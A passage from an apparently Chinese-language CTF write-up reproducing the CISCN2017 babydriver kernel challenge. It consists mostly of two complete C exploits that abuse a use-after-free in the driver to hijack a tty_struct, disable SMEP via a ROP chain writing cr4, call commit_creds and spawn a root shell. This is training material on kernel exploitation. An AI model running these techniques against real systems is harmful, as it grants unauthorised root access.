class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_root_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) = (<span class="type">void</span>* (*)(<span class="type">void</span>*))prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) = (<span class="type">void</span> (*)(<span class="type">void</span>*))commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> * root_cred = prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">    commit_creds(root_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got shell, welcome %s\n&quot;</span>, (getuid() ? <span class="string">&quot;user&quot;</span> : <span class="string">&quot;root&quot;</span>));</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_iret_data</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%cs, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;pushf&quot;</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;pop %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%rsp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%ss, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;[+] iret data saved.\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_cs: %ld\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_eflags: %ld\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_rsp: %p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_ss: %ld\n&quot;</span>,</span><br><span class="line">        user_cs, user_eflags, (<span class="type">char</span>*)user_rsp, user_ss</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请 tty_struct</span></span><br><span class="line">    <span class="type">int</span> master_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造一个 fake tty_operators</span></span><br><span class="line">    <span class="type">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr, <span class="comment">// int  (*write)(struct tty_struct*, const unsigned char *, int)</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_tty_ops constructed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> hijacked_stack_addr = ((<span class="type">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack addr: %p\n&quot;</span>, (<span class="type">char</span>*)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((fake_stack = mmap(</span><br><span class="line">            (<span class="type">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))),  <span class="comment">// addr, 页对齐</span></span><br><span class="line">            <span class="number">0x10000</span>,                                     <span class="comment">// length</span></span><br><span class="line">            PROT_READ | PROT_WRITE,                     <span class="comment">// prot</span></span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,    <span class="comment">// flags</span></span><br><span class="line">            <span class="number">-1</span>,                                         <span class="comment">// fd</span></span><br><span class="line">            <span class="number">0</span>)                                          <span class="comment">// offset</span></span><br><span class="line">        ) == MAP_FAILED)  </span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]     fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span>* hijacked_stack_ptr = (<span class="type">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="type">u_int64_t</span>)set_root_cred;</span><br><span class="line">    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                          <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = iretq_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="type">u_int64_t</span>)get_shell;       <span class="comment">// iret_data.rip</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = user_cs;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_eflags;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_rsp;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] privilege escape ROP prepared\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 tty_struct 结构体的所有数据</span></span><br><span class="line">    <span class="type">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="type">char</span>** ops_ptr_addr = (<span class="type">char</span>**)(overwrite_mem + ops_ptr_offset);</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] origin ops ptr addr: %p\n&quot;</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改并覆写 tty_struct 结构体</span></span><br><span class="line">    *ops_ptr_addr = (<span class="type">char</span>*)fake_tty_ops;</span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hacked ops ptr addr: %p\n&quot;</span>, *ops_ptr_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 触发 tty_write</span></span><br><span class="line">    <span class="comment">// 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT</span></span><br><span class="line">    <span class="type">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(master_fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行效果：</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211013214429834](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211013214429834.png)</a></p>
<p>下面是一个简化版的 exploit:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_root_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) = commit_creds_addr;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_iret_data</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%cs, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;pushf&quot;</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;pop %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%rsp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%ss, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> master_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> hijacked_stack_addr = ((<span class="type">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>)),</span><br><span class="line">            <span class="number">0x10000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">u_int64_t</span> rop_chain_mem[] = &#123;</span><br><span class="line">        pop_rdi_addr, <span class="number">0x6f0</span>, </span><br><span class="line">        mov_cr4_rdi_pop_rbp_addr, <span class="number">0</span>, set_root_cred,</span><br><span class="line">        swapgs_pop_rbp_addr, <span class="number">0</span>, </span><br><span class="line">        iretq_addr, get_shell, user_cs, user_eflags, user_rsp, user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(hijacked_stack_addr, rop_chain_mem, <span class="keyword">sizeof</span>(rop_chain_mem));</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="type">char</span>** ops_ptr_addr = overwrite_mem + ops_ptr_offset;</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    *ops_ptr_addr = fake_tty_ops;</span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(master_fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/10/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-CISCN2017_babydriver%20%E5%A4%8D%E7%8E%B0/">http://example.com/2024/07/10/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-CISCN2017_babydriver%20%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/10/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E5%88%A9%E7%94%A8/" title="内核安全利用"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">内核安全利用</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/10/%E5%86%85%E6%A0%B8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/" title="内核下载与编译"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内核下载与编译</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">370</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">53</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-CISCN2017-babydriver-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">内核学习入门-CISCN2017_babydriver 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">附件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">尝试执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-number">1.3.1.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.3.2.</span> <span class="toc-text">获取内核模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.4.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">设备文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E5%8F%B7"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">设备号</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babydriver-init"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">babydriver_init</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E8%AE%BE%E5%A4%87%E5%8F%B7"><span class="toc-number">1.3.4.2.1.</span> <span class="toc-text">申请设备号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87"><span class="toc-number">1.3.4.2.2.</span> <span class="toc-text">注册字符设备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%86%E8%AE%BE%E5%A4%87%E6%B3%A8%E5%86%8C%E8%BF%9B-sysfs"><span class="toc-number">1.3.4.2.3.</span> <span class="toc-text">将设备注册进 sysfs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#init-%E5%87%BD%E6%95%B0%E5%B0%8F%E7%BB%93"><span class="toc-number">1.3.4.2.4.</span> <span class="toc-text">init 函数小结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babydriver-exit"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">babydriver_exit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyopen"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">babyopen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyrelease"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">babyrelease</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyread"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">babyread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babywrite"><span class="toc-number">1.3.4.7.</span> <span class="toc-text">babywrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyioctl"><span class="toc-number">1.3.4.8.</span> <span class="toc-text">babyioctl</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.5.</span> <span class="toc-text">获取到的信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87"><span class="toc-number">1.4.</span> <span class="toc-text">调试前的准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kernel-%E7%9A%84-UAF-%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">kernel 的 UAF 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99-cred-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.5.1.</span> <span class="toc-text">覆写 cred 结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-ROP"><span class="toc-number">1.5.2.</span> <span class="toc-text">Kernel ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BB%88%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%B1%BB%E5%9E%8B%E7%AE%80%E4%BB%8B"><span class="toc-number">1.5.3.</span> <span class="toc-text">1) 终端设备类型简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BC%AA%E7%BB%88%E7%AB%AF%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.5.4.</span> <span class="toc-text">2) 伪终端的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-tty-struct-%E7%BB%93%E6%9E%84%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.5.</span> <span class="toc-text">3) tty_struct 结构的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ROP-%E5%88%A9%E7%94%A8"><span 